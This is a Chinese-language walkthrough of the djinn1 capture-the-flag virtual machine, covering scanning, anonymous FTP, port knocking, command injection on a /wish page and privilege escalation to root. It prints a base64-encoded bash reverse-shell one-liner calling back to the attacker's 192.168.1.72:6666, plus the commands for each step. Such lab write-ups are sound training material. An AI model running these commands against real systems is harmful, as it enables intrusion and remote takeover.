# djinn1靶机

## 复现过程

### 信息搜集

1. 扫描出网段下靶机ip`arp-scan -l`，192.168.1.72为操作机ip，192.168.1.87为靶机ip；

![image-20251201110550251](assets/image-20251201110550251.png)

2. 扫描靶机开放端口`nmap -sV -p- 192.168.1.87`；

![image-20251201110854213](assets/image-20251201110854213.png)

3. 连接ftp端口，使用匿名anonymous登录`ftp 192.168.1.87`；

![image-20251201095910108](assets/image-20251201095910108.png)

4. 查看文件`ls -a`，存在三个文件 ，使用get命令将文件下载到本地；

   ```
   get creds.txt
   get game.txt
   get message.txt
   ```

![image-20251201101137545](assets/image-20251201101137545.png)

5. 查看文件内容，得到提示

   ```
   cat creds.txt
   cat game.txt //1337端口有一个游戏，通过可以获得奖励；
   cat message.txt
   ```

![image-20251201101414135](assets/image-20251201101414135.png)

6. 连接1337端口`nc -vv 192.168.1.87 1337`，提示连续回答问题100次可以获得奖励；

![image-20251201102142587](assets/image-20251201102142587.png)

7. 上传附件中的脚本，切换到根目录`cd /`，解压文件`unzip 脚本.zip`，执行脚本文件`python 脚本.py`；

![image-20251201104636723](assets/image-20251201104636723.png)

8. 运行结果展示了三个端口，1356 6784 3409；

![image-20251201104730442](assets/image-20251201104730442.png)

9. 依次对三个端口进行敲门`knock 192.168.1.87 1356 6784 3409`,nmap扫描22端口`nmap -p 22 192.168.1.87`验证是否开放；

![image-20251201105556231](assets/image-20251201105556231.png)

10. 访问7331端口，没有什么有用的线索；

![image-20251201111012437](assets/image-20251201111012437.png)

11. 对目录进行遍历，默认字典扫不出来，我们使用kali内置字典；

    ```
    dirsearch -u http://192.168.1.87:7331/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
    ```

![image-20251201112226064](assets/image-20251201112226064.png)

12. 访问/wish页面，发现存在命令执行漏洞，输入语句测试`whoami`；

![image-20251201111849542](assets/image-20251201111849542.png)

13. submit提交后页面跳转，url中返回执行结果，存在RCE漏洞；

![image-20251201112030467](assets/image-20251201112030467.png)

### 反弹shell

1. 开启6666端口监听`nc -lvp 6666`；

![image-20251201113249111](assets/image-20251201113249111.png)

2. 将反弹shell语句进行base64编码；

   ```
   echo "bash -i >& /dev/tcp/192.168.1.72/6666 0>&1"|base64
   ```

![image-20251201113201490](assets/image-20251201113201490.png)

3. 对编码后的语句制作解码反弹shell，在命令执行中输入并submit提交；

   ```
   echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNzIvNjY2NiAwPiYxCg==|base64 -d |bash
   ```

![image-20251201113628341](assets/image-20251201113628341.png)

4. 成功反弹shell；

![image-20251201113755545](assets/image-20251201113755545.png)

### 提权过程

1. 先开启虚拟终端`python -c "import pty;pty.spawn('/bin/bash')"`，再切换到nitish目录下`cd /home/nitish`,查看文件`ls -a`，切换到dev目录`cd .dev`,查看creds.txt文件`cat creds.txt`，发现nitish用户密码；

![image-20251202175902014](assets/image-20251202175902014.png)

2. 切换到nitish用户`su nitish`；

![image-20251201120933712](assets/image-20251201120933712.png)

3. 查看当前用户权限`sudo -l`，sam用户可以执行genie命令；

![image-20251201114749605](assets/image-20251201114749605.png)

4. 以sam身份执行genie命令`sudo -u sam genie -cmd id`，成功切换为sam；

![image-20251201115429300](assets/image-20251201115429300.png)

5. 再次查看用户权限`sudo -l`，发现可以用root身份无密码执行lago命令；

![image-20251201115600198](assets/image-20251201115600198.png)

6. 用root身份执行lago命令`sudo -u root /root/lago`，会给出4个选择，选择2后输入`num`切换为root用户；

![image-20251201115917407](assets/image-20251201115917407.png)

7. 切换到root目录下`cd /root` 查看`ls` 存在文件，发现proof.sh脚本，执行`./proof.sh`，得到flag；

![image-20251201120146353](assets/image-20251201120146353.png)